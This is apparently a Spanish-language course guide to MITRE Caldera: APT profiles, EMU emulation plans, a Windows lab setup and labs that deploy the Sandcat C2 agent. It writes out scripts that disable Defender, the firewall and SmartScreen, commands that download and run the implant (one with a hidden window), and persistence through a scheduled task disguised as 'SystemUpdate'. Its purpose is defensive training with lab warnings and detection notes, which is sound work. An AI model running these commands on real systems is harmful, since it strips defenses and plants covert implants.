**Descripción**: OilRig es un actor de amenaza cibernética con operaciones alineadas a los objetivos estratégicos del gobierno iraní. OilRig ha estado operativo desde al menos 2014 y tiene un historial de impacto generalizado.

#### 8. Sandworm (Voodoo Bear, ELECTRUM)

| Atribución              | Rusia (GRU - Dirección Principal de Inteligencia)                           |
| ----------------------- | --------------------------------------------------------------------------- |
| **Motivación**          | Ciberguerra, disrupción                                                     |
| **Objetivos**           | Infraestructura crítica, elecciones, Juegos Olímpicos                       |
| **Técnicas destacadas** | NotPetya, Industroyer/CrashOverride, Olympic Destroyer, destructive malware |

**Descripción**: Sandworm es un grupo de amenaza destructivo atribuido al Estado Mayor de las Fuerzas Armadas de Rusia, Dirección Principal de Inteligencia (GRU). Conocido por conducir campañas destructivas, agresivas y bien financiadas a gran escala.

#### 9. Turla

| Atribución              | Rusia (FSB - Servicio Federal de Seguridad)                                |
| ----------------------- | -------------------------------------------------------------------------- |
| **Motivación**          | Espionaje cibernético                                                      |
| **Objetivos**           | Gobiernos, embajadas, militares, educación, investigación                  |
| **Técnicas destacadas** | Malware sofisticado (Snake, Uroburos), satellite hijacking, watering holes |

**Descripción**: Activo desde al menos principios de los 2000, Turla es un grupo de amenaza sofisticado basado en Rusia que ha infectado víctimas en más de 50 países. Turla aprovecha técnicas novedosas y herramientas personalizadas para eludir defensas.

#### 10. Wizard Spider

| Atribución              | Rusia (cibercrimen organizado)                           |
| ----------------------- | -------------------------------------------------------- |
| **Motivación**          | Ganancia financiera - ransomware "big game hunting"      |
| **Objetivos**           | Organizaciones grandes (corporaciones, gobiernos, salud) |
| **Técnicas destacadas** | Trickbot, Ryuk ransomware, Emotet, Conti ransomware      |

**Descripción**: Wizard Spider es un grupo de e-crime basado en Rusia originalmente conocido por el malware bancario Trickbot. En agosto de 2018 agregaron capacidades para desplegar el ransomware Ryuk, resultando en campañas de "caza mayor" enfocadas en organizaciones grandes.

#### 11. Blind Eagle (APT-C-36)

| Atribución              | Sudamérica (posiblemente Colombia)                                |
| ----------------------- | ----------------------------------------------------------------- |
| **Motivación**          | Espionaje, oportunismo                                            |
| **Objetivos**           | Instituciones colombianas (finanzas, manufactura, petróleo)       |
| **Técnicas destacadas** | RATs comerciales modificados (AsyncRAT, NjRAT), phishing regional |

**Descripción**: Blind Eagle es un actor de amenaza sudamericano enfocado en instituciones con sede en Colombia. Mayormente oportunista en sus motivos, Blind Eagle aprovecha RATs comerciales modificados para adaptarse al entorno.

### Micro Emulation Plans disponibles

| Plan                             | Técnicas ATT&CK          | Descripción                                                    |
| -------------------------------- | ------------------------ | -------------------------------------------------------------- |
| **Active Directory Enumeration** | TA0007 Discovery         | Enumeración de AD vía interfaces/servicios comúnmente abusados |
| **Data Exfiltration**            | TA0010 Exfiltration      | Encontrar, staging, archivar y extraer archivos sensibles      |
| **DLL Sideloading**              | T1574.002                | Hijacking de módulos/librerías de aplicaciones legítimas       |
| **File Access & Modification**   | TA0009 Collection, T1486 | Acceso y modificación de archivos (ransomware-like)            |
| **Log Clearing**                 | T1070.001                | Eliminación de Windows Event Logs                              |
| **Named Pipes**                  | DS0023                   | Creación y uso de named pipes (Cobalt Strike patterns)         |
| **Process Injection**            | T1055, T1059             | Inyección de código + ejecución de comandos arbitrarios        |
| **Reflective Loading**           | T1620                    | Carga reflectiva de código malicioso                           |
| **Remote Code Execution**        | T1190                    | Explotación de aplicaciones web públicas                       |
| **User Execution**               | T1566.001, T1204.002     | Entrega y ejecución de archivos maliciosos (.doc, .lnk, .iso)  |
| **Web Shells**                   | T1505.003, T1059         | Planting y ejecución de comandos vía web shell                 |
| **Windows Registry**             | DS0024                   | Modificación del registro de Windows                           |

### Uso básico del Plugin EMU

#### Seleccionar adversario EMU en operación

1. Navegar a **Operations** → **"+"** (crear operación)
2. En **Adversary**, seleccionar uno con etiqueta **(Emu)**:
   - Ejemplo: `FIN7 (Emu)`
3. **IMPORTANTE**: En **Source**, seleccionar la fuente correspondiente:
   - Para FIN7, seleccionar: `FIN7 (Emu)`
4. Configurar grupo de agentes y planificador
5. Iniciar operación

#### Estructura de una operación EMU

Las operaciones EMU típicamente requieren:

1. **Infraestructura específica**:
   - Servidores de staging para payloads
   - Objetivos con configuraciones específicas (AD, servicios)

2. **Facts iniciales (Sources)**:
   - Credenciales de usuario inicial
   - Direcciones IP de servidores
   - Rutas de archivos
   - Dominios

3. **Payloads disponibles**:
   - Herramientas descargadas por `download_payloads.sh`
   - Binarios compilados en los planes de emulación

#### Ejemplo: Ejecutar FIN7 (simplificado)

```bash
# 1. Asegurar que payloads están descargados
cd plugins/emu
./download_payloads.sh
cd ../..

# 2. Reiniciar Caldera
python3 server.py --insecure

# 3. En interfaz web:
#    - Adversary: FIN7 (Emu)
#    - Source: FIN7 (Emu)
#    - Group: <tu grupo de agentes>
#    - Autonomous: 1
```

### Consideraciones de uso

#### Complejidad de infraestructura

Los planes de emulación completa **requieren infraestructura específica**:

- **Active Directory**: Muchos APTs apuntan a entornos AD
- **Múltiples hosts**: Movimiento lateral requiere múltiples sistemas
- **Servicios específicos**: Webservers, bases de datos, file shares
- **Segmentación de red**: Simular redes corporativas realistas

#### Duración de operaciones

- **Planes completos**: 1-4 horas de ejecución
- **Micro planes**: 5-15 minutos
- **Recomendación**: Comenzar con micro planes antes de planes completos

#### Personalización de facts

Los facts iniciales en las sources EMU están con valores de ejemplo:

```yaml
# Fuente FIN7 (ejemplo)
facts:
  - trait: domain_user
    value: user              # CAMBIAR a usuario real
  - trait: internal_IP
    value: 127.0.0.1         # CAMBIAR a IP objetivo real
  - trait: distribution_server
    value: 127.0.0.1         # CAMBIAR a servidor de staging
```

**Recomendación**: Crear sources personalizadas basadas en el entorno de laboratorio.

### Ventajas del Plugin EMU para educación

1. **Realismo**: Simula adversarios documentados del mundo real
2. **Completitud**: Cadenas de ataque end-to-end (no técnicas aisladas)
3. **Inteligencia aplicada**: Operacionaliza reportes de threat intelligence
4. **Validación de defensas**: Prueba detecciones contra TTPs reales
5. **Entrenamiento Purple Team**: Ejercicios basados en adversarios conocidos

### Limitaciones

1. **Complejidad**: Requiere infraestructura más compleja que Stockpile
2. **Payloads externos**: Algunos payloads no incluidos por licencia
3. **Dependencias de plataforma**: Muchos planes enfocados en Windows
4. **Mantenimiento**: Los planes CTID se actualizan periódicamente

### Recursos adicionales

- **Biblioteca CTID**: [github.com/center-for-threat-informed-defense/adversary_emulation_library](https://github.com/center-for-threat-informed-defense/adversary_emulation_library)
- **Documentación de cada plan**: Cada adversario incluye Intelligence Summary, Operations Flow y Emulation Plan en su directorio
- **Ejemplo**: `/plugins/emu/data/adversary-emulation-plans/apt29/README.md`

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">4. Preparación del entorno de laboratorio Windows</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Contexto

Antes de desplegar agentes en máquinas virtuales Windows de prueba, es necesario **deshabilitar temporalmente las defensas de Windows** que bloquearán los agentes de Caldera. Windows Defender y otras protecciones detectarán el agente Sandcat como potencialmente malicioso (lo cual es correcto, ya que es un implante C2).

> ⚠️ **ADVERTENCIA CRÍTICA DE SEGURIDAD**
>
> Los comandos de esta sección SOLO deben ejecutarse en:
> - ✓ Máquinas virtuales de laboratorio aisladas
> - ✓ Entornos sin conexión a Internet
> - ✓ Redes completamente segmentadas de producción
>
> **NUNCA** ejecutar estos comandos en:
> - ✗ Sistemas de producción
> - ✗ Computadoras personales conectadas a redes corporativas
> - ✗ Máquinas con datos sensibles
>
> Deshabilitar defensas deja el sistema completamente vulnerable a malware real.

### Defensas de Windows que interfieren con laboratorios

| Defensa                         | Impacto en laboratorio                     | Acción requerida                  |
| ------------------------------- | ------------------------------------------ | --------------------------------- |
| **Windows Defender Antivirus**  | Bloquea/elimina agente Sandcat             | Deshabilitar Real-time Protection |
| **Cloud-delivered Protection**  | Envía muestras a Microsoft                 | Deshabilitar                      |
| **Automatic Sample Submission** | Envía archivos sospechosos                 | Deshabilitar                      |
| **Windows Firewall**            | Bloquea beacons HTTP/TCP                   | Deshabilitar o crear reglas       |
| **SmartScreen**                 | Bloquea descargas "no seguras"             | Deshabilitar                      |
| **Controlled Folder Access**    | Impide escritura en directorios protegidos | Deshabilitar o agregar exclusión  |

### Método 1: Deshabilitar Windows Defender (PowerShell como Administrador)

#### Paso 1: Abrir PowerShell como Administrador

```powershell
# Presionar Windows + X
# Seleccionar "Windows PowerShell (Admin)" o "Terminal (Admin)"
# Si aparece UAC, hacer clic en "Sí"
```

#### Paso 2: Verificar estado actual de Defender

```powershell
# Ver configuración actual de Windows Defender
Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableIOAVProtection, DisableScriptScanning
```

#### Paso 3: Deshabilitar Real-time Protection

```powershell
# Deshabilitar protección en tiempo real (la más importante)
Set-MpPreference -DisableRealtimeMonitoring $true

# Deshabilitar monitoreo de comportamiento
Set-MpPreference -DisableBehaviorMonitoring $true

# Deshabilitar protección al descargar archivos
Set-MpPreference -DisableIOAVProtection $true

# Deshabilitar escaneo de scripts
Set-MpPreference -DisableScriptScanning $true

# Deshabilitar protección entregada por la nube
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -MAPSReporting 0

# Deshabilitar envío automático de muestras
Set-MpPreference -SubmitSamplesConsent 2
```

**Explicación de parámetros**:
- `DisableRealtimeMonitoring`: Desactiva escaneo en tiempo real
- `DisableBehaviorMonitoring`: Desactiva detección de comportamiento sospechoso
- `DisableIOAVProtection`: Desactiva escaneo de descargas
- `DisableScriptScanning`: Desactiva análisis de PowerShell/scripts
- `MAPSReporting 0`: Desactiva Microsoft Active Protection Service
- `SubmitSamplesConsent 2`: Nunca enviar muestras

#### Paso 4: Agregar exclusiones de directorios (alternativa menos agresiva)

Si se prefiere mantener Defender activo pero excluir directorios específicos:

```powershell
# Agregar exclusión para directorio donde se descargará el agente
Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionPath "C:\Temp"

# Agregar exclusión por proceso (nombre del agente)
Add-MpPreference -ExclusionProcess "sandcat.exe"
Add-MpPreference -ExclusionProcess "splunkd.exe"

# Ver exclusiones configuradas
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess
```

#### Paso 5: Deshabilitar Windows Defender completamente (opcional)

Para deshabilitar el servicio completamente (requiere reinicio):

```powershell
# Deshabilitar el servicio de Windows Defender
Set-Service -Name WinDefend -StartupType Disabled

# Detener el servicio
Stop-Service -Name WinDefend -Force

# Verificar estado del servicio
Get-Service WinDefend
```

**Nota**: En versiones recientes de Windows 10/11, Microsoft puede revertir automáticamente esta configuración. Para deshabilitación permanente se requiere editar Group Policy o Registro.

### Método 2: Deshabilitar vía Group Policy (alternativa)

#### Editor de directivas de grupo local

```powershell
# Abrir Editor de directivas de grupo
gpedit.msc
```

Luego navegar manualmente a:
1. **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Windows Defender Antivirus**
2. Doble clic en **"Turn off Windows Defender Antivirus"**
3. Seleccionar **"Enabled"**
4. Clic en **"Apply"** y **"OK"**
5. Reiniciar el sistema

#### Via PowerShell (modificación de registro)

```powershell
# Crear clave de registro para deshabilitar Defender
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (!(Test-Path $DefenderPath)) {
    New-Item -Path $DefenderPath -Force
}
Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord

# Requiere reinicio para tomar efecto
Write-Host "Se requiere reinicio para que los cambios tomen efecto" -ForegroundColor Yellow
```

### Método 3: Deshabilitar Windows Firewall

El firewall de Windows puede bloquear las comunicaciones beacon del agente.

```powershell
# Deshabilitar firewall para todos los perfiles (Domain, Private, Public)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Verificar estado
Get-NetFirewallProfile | Select-Object Name, Enabled
```

**Salida esperada**:
```
Name    Enabled
----    -------
Domain    False
Private   False
Public    False
```

#### Alternativa: Crear regla específica (más seguro)

Si se prefiere mantener el firewall activo pero permitir Caldera:

```powershell
# Permitir tráfico saliente HTTP/HTTPS al servidor Caldera
New-NetFirewallRule -DisplayName "Caldera Agent Outbound" `
    -Direction Outbound `
    -Action Allow `
    -Protocol TCP `
    -LocalPort Any `
    -RemotePort 8888,8443,7010,7011,7012 `
    -Profile Any

# Permitir el ejecutable del agente
New-NetFirewallRule -DisplayName "Sandcat Agent" `
    -Direction Outbound `
    -Program "C:\Users\Public\sandcat.exe" `
    -Action Allow `
    -Profile Any
```

### Método 4: Deshabilitar SmartScreen

SmartScreen puede bloquear la descarga o ejecución del agente.

```powershell
# Deshabilitar SmartScreen para aplicaciones y archivos
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
    -Name "SmartScreenEnabled" -Value "Off"

# Deshabilitar SmartScreen en Microsoft Edge
$EdgePath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge\PhishingFilter"
if (!(Test-Path $EdgePath)) {
    New-Item -Path $EdgePath -Force
}
Set-ItemProperty -Path $EdgePath -Name "EnabledV9" -Value 0
```

### Método 5: Deshabilitar Controlled Folder Access

```powershell
# Deshabilitar acceso controlado a carpetas (Ransomware Protection)
Set-MpPreference -EnableControlledFolderAccess Disabled

# Verificar
Get-MpPreference | Select-Object EnableControlledFolderAccess
```

### Script completo de preparación de laboratorio

Script que ejecuta todas las configuraciones de una vez:

```powershell
# ============================================================
# Script de preparación de VM Windows para laboratorios Caldera
# SOLO PARA ENTORNOS DE LABORATORIO AISLADOS
# ============================================================

Write-Host "[*] Iniciando configuración de laboratorio Windows..." -ForegroundColor Cyan

# 1. Deshabilitar Windows Defender Real-time Protection
Write-Host "[+] Deshabilitando Windows Defender..." -ForegroundColor Yellow
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2

# 2. Agregar exclusiones
Write-Host "[+] Agregando exclusiones..." -ForegroundColor Yellow
Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
Add-MpPreference -ExclusionProcess "sandcat.exe"
Add-MpPreference -ExclusionProcess "splunkd.exe"

# 3. Deshabilitar Windows Firewall
Write-Host "[+] Deshabilitando Windows Firewall..." -ForegroundColor Yellow
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# 4. Deshabilitar SmartScreen
Write-Host "[+] Deshabilitando SmartScreen..." -ForegroundColor Yellow
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
    -Name "SmartScreenEnabled" -Value "Off" -ErrorAction SilentlyContinue

# 5. Deshabilitar Controlled Folder Access
Write-Host "[+] Deshabilitando Controlled Folder Access..." -ForegroundColor Yellow
Set-MpPreference -EnableControlledFolderAccess Disabled

# Verificar configuración
Write-Host "`n[*] Verificando configuración..." -ForegroundColor Cyan
$DefenderStatus = Get-MpPreference | Select-Object DisableRealtimeMonitoring
$FirewallStatus = Get-NetFirewallProfile | Select-Object Name, Enabled

Write-Host "`n=== Estado de Windows Defender ===" -ForegroundColor Green
Write-Host "Real-time Protection: $($DefenderStatus.DisableRealtimeMonitoring)" -ForegroundColor White

Write-Host "`n=== Estado de Windows Firewall ===" -ForegroundColor Green
$FirewallStatus | Format-Table -AutoSize

Write-Host "`n[✓] Configuración de laboratorio completada" -ForegroundColor Green
Write-Host "[!] RECORDATORIO: Este sistema está ahora sin defensas - SOLO para laboratorio" -ForegroundColor Red
```

**Guardar y ejecutar**:

```powershell
# Guardar script
Set-Content -Path "C:\Temp\PrepararLabCaldera.ps1" -Value $ScriptContent

# Ejecutar
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
C:\Temp\PrepararLabCaldera.ps1
```

### Verificación de configuración

Verificar que las defensas están deshabilitadas:

```powershell
# Estado de Windows Defender
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, AntivirusEnabled

# Estado de Firewall
Get-NetFirewallProfile | Select-Object Name, Enabled

# Exclusiones configuradas
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess
```

**Salida esperada (defensas deshabilitadas)**:
```
RealTimeProtectionEnabled : False
BehaviorMonitorEnabled    : False
IoavProtectionEnabled     : False
AntivirusEnabled          : False
```

### Cómo revertir (re-habilitar defensas)

Al finalizar el laboratorio, re-habilitar las defensas:

```powershell
# ============================================================
# Script para restaurar defensas de Windows
# ============================================================

Write-Host "[*] Restaurando defensas de Windows..." -ForegroundColor Cyan

# 1. Re-habilitar Windows Defender
Write-Host "[+] Habilitando Windows Defender..." -ForegroundColor Yellow
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false
Set-MpPreference -MAPSReporting 2
Set-MpPreference -SubmitSamplesConsent 1

# 2. Re-habilitar Windows Firewall
Write-Host "[+] Habilitando Windows Firewall..." -ForegroundColor Yellow
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# 3. Re-habilitar SmartScreen
Write-Host "[+] Habilitando SmartScreen..." -ForegroundColor Yellow
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
    -Name "SmartScreenEnabled" -Value "Warn" -ErrorAction SilentlyContinue

# 4. Re-habilitar Controlled Folder Access
Write-Host "[+] Habilitando Controlled Folder Access..." -ForegroundColor Yellow
Set-MpPreference -EnableControlledFolderAccess Enabled

# 5. Limpiar archivos del agente (opcional)
Write-Host "[+] Limpiando archivos del agente..." -ForegroundColor Yellow
Remove-Item "C:\Users\Public\sandcat.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Windows\Temp\sandcat*" -Force -ErrorAction SilentlyContinue

Write-Host "`n[✓] Defensas restauradas exitosamente" -ForegroundColor Green
Write-Host "[!] Se recomienda reiniciar el sistema" -ForegroundColor Yellow
```

### Alternativa: Snapshot de VM

**Recomendación de flujo de trabajo con VMs**:

1. **Crear snapshot "Limpia"**: VM Windows fresca instalada
2. **Crear snapshot "Lab-Ready"**: Después de deshabilitar defensas
3. **Ejecutar laboratorios**: Trabajar sobre "Lab-Ready"
4. **Revertir a "Lab-Ready"**: Entre laboratorios
5. **Revertir a "Limpia"**: Al finalizar completamente

```bash
# Ejemplo con VirtualBox
VBoxManage snapshot "Windows10-Lab" take "Lab-Ready"
VBoxManage snapshot "Windows10-Lab" restore "Lab-Ready"
```

### Solución de problemas comunes

#### Problema: "Access Denied" al ejecutar comandos

**Solución**: Asegurar que PowerShell se ejecuta como Administrador.

```powershell
# Verificar si se está ejecutando como admin
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

Si devuelve `False`, cerrar y abrir PowerShell como Administrador.

#### Problema: Defender se reactiva automáticamente

**Solución**: Windows 10/11 Home puede reactivar Defender automáticamente. Opciones:

1. Usar Windows 10/11 Pro/Enterprise (permite Group Policy)
2. Deshabilitar servicio `WinDefend` completamente
3. Usar herramienta de terceros: **Defender Control** (para laboratorios)

#### Problema: El agente aún es bloqueado

**Solución**: Verificar otras protecciones:

```powershell
# Verificar si hay EDR de terceros instalado
Get-Service | Where-Object {$_.DisplayName -like "*antivirus*" -or $_.DisplayName -like "*endpoint*"}

# Verificar servicios de seguridad activos
Get-Process | Where-Object {$_.ProcessName -match "av|defender|endpoint|security"}
```

### Consideraciones finales

1. **Documentar cambios**: Mantener registro de qué defensas se deshabilitaron
2. **Tiempo limitado**: Re-habilitar defensas inmediatamente después del laboratorio
3. **Aislamiento de red**: Asegurar que VM no tiene acceso a redes corporativas
4. **Snapshot/Backup**: Siempre tener forma de restaurar VM a estado seguro

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">5. Laboratorio 1 - Despliegue del primer agente</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Objetivos del laboratorio

1. Comprender el proceso de despliegue de agentes
2. Establecer comunicación C2 con el servidor Caldera
3. Verificar las propiedades del agente
4. Explorar la interfaz de gestión de agentes

### Requisitos previos

- Servidor Caldera ejecutándose en `http://localhost:8888`
- Sistema objetivo (VM Linux recomendada para primera práctica)
- Acceso de terminal al sistema objetivo
- Conectividad de red entre servidor y objetivo

### Escenario del laboratorio

Se desplegará un agente **Sandcat** en un sistema Linux de prueba. Este agente establecerá comunicación HTTP con el servidor Caldera y quedará disponible para ejecutar operaciones.

### Paso 1: Acceder a la pestaña de Agentes

1. Abrir navegador web y navegar a `http://localhost:8888`
2. Iniciar sesión con credenciales:
   - Usuario: `red`
   - Contraseña: `admin`
3. En el menú lateral izquierdo, hacer clic en **"Agents"**
4. Observar que inicialmente la lista de agentes está vacía

### Paso 2: Generar comando de despliegue

1. En la pestaña Agents, hacer clic en el botón **"deploy an agent"**
2. Se presentará un modal con opciones de despliegue
3. Configurar las siguientes opciones:

   | Opción              | Valor recomendado |
   | ------------------- | ----------------- |
   | **Agent**           | Sandcat           |
   | **Platform**        | linux             |
   | **Delivery Method** | HTTP              |
   | **Group**           | red               |

4. El sistema generará automáticamente un comando de despliegue

### Paso 3: Comprender el comando de despliegue

El comando generado tendrá la siguiente estructura:

```bash
server="http://192.168.1.100:8888";
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:linux" \
  -H "server:$server" \
  -H "group:red" \
  $server/file/download > /tmp/sandcat-linux && \
chmod +x /tmp/sandcat-linux && \
/tmp/sandcat-linux -server $server -group red -v
```

#### Análisis del comando

1. **Variable de servidor**: Define la dirección del servidor Caldera
   ```bash
   server="http://192.168.1.100:8888"
   ```

2. **Descarga del agente**: Utiliza curl con headers personalizados
   ```bash
   curl -s -X POST \
     -H "file:sandcat.go" \      # Solicita el binario de Sandcat
     -H "platform:linux" \        # Especifica plataforma Linux
     -H "server:$server" \        # Dirección del servidor C2
     -H "group:red" \             # Grupo lógico del agente
     $server/file/download        # Endpoint de descarga
   ```

3. **Permisos de ejecución**: Hace el binario ejecutable
   ```bash
   chmod +x /tmp/sandcat-linux
   ```

4. **Ejecución del agente**: Inicia el agente con parámetros
   ```bash
   /tmp/sandcat-linux -server $server -group red -v
   ```
   - `-server`: Dirección del servidor C2
   - `-group`: Grupo de membresía
   - `-v`: Modo verbose (depuración)

### Paso 4: Ejecutar el comando en el sistema objetivo

1. Copiar el comando completo generado por Caldera
2. Conectarse al sistema Linux objetivo vía SSH o terminal local
3. Pegar y ejecutar el comando
4. Observar la salida verbose del agente:

```
[*] Starting sandcat agent
[*] Server: http://192.168.1.100:8888
[*] Group: red
[*] Platform: linux
[*] Executors: sh, bash
[*] Beaconing every 30-60 seconds
[*] Initial beacon sent
[*] Successfully connected to C2 server
```

### Paso 5: Verificar conexión del agente en Caldera

1. Regresar a la interfaz web de Caldera
2. En la pestaña **Agents**, actualizar la página si es necesario
3. El nuevo agente debe aparecer en la lista con información detallada:

#### Información del agente desplegado

| Campo         | Ejemplo         | Descripción                     |
| ------------- | --------------- | ------------------------------- |
| **PAW**       | `c3f4a7b2`      | Identificador único del agente  |
| **Hostname**  | `ubuntu-lab`    | Nombre del sistema comprometido |
| **Platform**  | `linux`         | Sistema operativo               |
| **Executors** | `sh, bash`      | Intérpretes disponibles         |
| **Group**     | `red`           | Grupo asignado                  |
| **Privilege** | `User`          | Nivel de privilegios actual     |
| **Contact**   | `HTTP`          | Método C2 utilizado             |
| **Last Seen** | `5 seconds ago` | Última comunicación             |
| **Status**    | `alive`         | Estado del agente               |

### Paso 6: Explorar propiedades del agente

1. Hacer clic en el agente para expandir sus detalles
2. Observar secciones adicionales:
   - **Facts**: Datos conocidos sobre el sistema
   - **Links**: Historial de comandos ejecutados
   - **Abilities**: Habilidades aplicables a este agente

### Paso 7: Modificar propiedades del agente (opcional)

El operador puede modificar ciertas propiedades del agente:

1. **Cambiar grupo**: Reasignar a otro grupo lógico
2. **Ajustar sleep interval**: Modificar frecuencia de beacons
3. **Matar agente**: Terminar la sesión del agente

### Variantes de despliegue

#### Despliegue en Windows (PowerShell)

```powershell
$server="http://192.168.1.100:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("server",$server);
$wc.Headers.add("group","red");
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);
Start-Process -FilePath $output -ArgumentList "-server $server" -WindowStyle hidden;
```

#### Despliegue en macOS

```bash
server="http://192.168.1.100:8888";
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:darwin" \
  -H "server:$server" \
  -H "group:red" \
  $server/file/download > /tmp/sandcat-darwin && \
chmod +x /tmp/sandcat-darwin && \
/tmp/sandcat-darwin -server $server -group red -v
```

#### Despliegue con canal C2 alternativo (TCP)

```bash
server="http://192.168.1.100:8888";
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:linux" \
  -H "server:$server" \
  -H "group:red" \
  -H "contact:tcp" \
  $server/file/download > /tmp/sandcat-linux && \
chmod +x /tmp/sandcat-linux && \
/tmp/sandcat-linux -server 192.168.1.100:7010 -contact tcp -group red
```

### Persistencia del agente (Ejercicio avanzado)

Para mantener el agente activo después de reinicios (solo para laboratorios controlados):

#### Linux (systemd)

```bash
# Crear servicio systemd
sudo cat > /etc/systemd/system/sandcat.service <<EOF
[Unit]
Description=Sandcat Agent
After=network.target

[Service]
Type=simple
ExecStart=/opt/sandcat/sandcat-linux -server http://192.168.1.100:8888 -group red
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Habilitar y arrancar servicio
sudo systemctl daemon-reload
sudo systemctl enable sandcat.service
sudo systemctl start sandcat.service
```

#### Windows (Scheduled Task)

```powershell
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\sandcat.exe" -Argument "-server http://192.168.1.100:8888"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "System Update Service"
```

### Consideraciones de detección (Perspectiva Blue Team)

#### Indicadores de compromiso (IOCs)

1. **Proceso sospechoso**:
   - Nombre: `splunkd` (pero sin Splunk instalado)
   - Ubicación inusual: `/tmp/`, `C:\Users\Public\`

2. **Conexiones de red**:
   - Beacons HTTP regulares cada 30-60 segundos
   - Conexión persistente a puerto 8888

3. **Artefactos de sistema de archivos**:
   - Binario en directorios temporales
   - Permisos de ejecución recientes

#### Detección con herramientas estándar

```bash
# Buscar procesos sospechosos
ps aux | grep -i sandcat
ps aux | grep -i splunkd

# Verificar conexiones de red activas
netstat -antp | grep 8888
ss -antp | grep 8888

# Monitorear con Sysmon (Windows)
# Event ID 3: Network Connection
# Event ID 1: Process Creation
```

### Preguntas de reflexión

1. ¿Qué tipo de tráfico de red genera el agente al hacer beacon?
2. ¿Cómo podría un EDR detectar este agente?
3. ¿Qué técnica ATT&CK representa el despliegue inicial del agente?
4. ¿Cómo se vería diferente el despliegue en un escenario de phishing real?

### Resultado esperado

Al finalizar este laboratorio, el estudiante habrá:

✓ Desplegado exitosamente un agente Sandcat
✓ Establecido comunicación C2 con el servidor Caldera
✓ Comprendido las propiedades y metadata del agente
✓ Explorado opciones de despliegue multiplataforma
✓ Reflexionado sobre indicadores de detección

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">6. Laboratorio 2 - Operación de descubrimiento con adversario "Check"</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Objetivos del laboratorio

1. Crear y ejecutar la primera operación en Caldera
2. Utilizar un adversario pre-construido
3. Observar la ejecución de técnicas ATT&CK
4. Analizar resultados y facts descubiertos
5. Comprender el flujo de una operación

### Requisitos previos

- Servidor Caldera ejecutándose
- Al menos un agente desplegado y activo (Laboratorio 1 completado)
- Agente en estado "alive" o "trusted"

### Escenario del laboratorio

Se ejecutará el adversario **"Check"** contra el agente desplegado. Este adversario realiza reconocimiento básico del sistema para verificar la configuración de la plataforma y recopilar información del entorno.

### Paso 1: Navegar a la pestaña de Operaciones

1. En la interfaz web de Caldera, hacer clic en **"Operations"** en el menú lateral
2. Observar la lista de operaciones existentes (puede estar vacía inicialmente)
3. Hacer clic en el botón **"+"** para crear una nueva operación

### Paso 2: Configurar la operación

Se presentará un formulario de configuración. Completar los siguientes campos:

| Campo          | Valor            | Explicación                                           |
| -------------- | ---------------- | ----------------------------------------------------- |
| **Name**       | `Lab2-Discovery` | Nombre identificador de la operación                  |
| **Adversary**  | `Check`          | Perfil de adversario a ejecutar                       |
| **Group**      | `red`            | Grupo de agentes objetivo                             |
| **Planner**    | `atomic`         | Planificador por defecto (ejecución secuencial)       |
| **Source**     | `None`           | Sin facts iniciales requeridos                        |
| **Autonomous** | `1`              | Modo automático (ejecución completa sin intervención) |
| **Obfuscator** | `plain-text`     | Sin ofuscación (para facilitar aprendizaje)           |
| **Jitter**     | `2/8`            | Aleatorización de ±2 segundos en beacons              |

#### Explicación de campos clave

**Autonomous = 1 (Automático)**
- El planificador ejecutará todas las habilidades sin intervención del operador
- Ideal para emulación completa de adversarios

**Autonomous = 0 (Manual)**
- El operador debe aprobar cada habilidad antes de ejecutar
